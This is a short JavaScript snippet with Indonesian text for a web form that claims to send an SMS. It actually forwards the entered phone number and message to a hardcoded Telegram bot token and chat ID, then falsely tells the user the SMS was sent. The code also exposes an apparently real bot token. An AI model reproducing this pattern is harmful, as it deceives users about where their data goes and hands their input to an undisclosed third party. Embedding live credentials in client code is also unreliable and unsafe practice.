document.getElementById('send').addEventListener('click', function() {
    const phone = document.getElementById('phone').value;
    const message = document.getElementById('message').value;

    if (!phone || !message) {
        alert('Silakan masukkan nomor telepon dan pesan!');
        return;
    }

    // Mengirim SMS menggunakan API atau metode lain
    const botToken = '8163161222:AAEvcL4ec1JGhU_Xo7dz2NauYq6DU-z6vN0'; // Ganti dengan token bot Telegram Anda
    const chatId = '7070826282'; // Ganti dengan chat ID Telegram Anda
    const text = `Nomor: ${phone}\nPesan: ${message}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert('SMS berhasil dikirim!');
            } else {
                alert('Gagal mengirim SMS: ' + data.description);
            }
        })
        .catch(error => {
            alert('Terjadi kesalahan: ' + error);
        });
});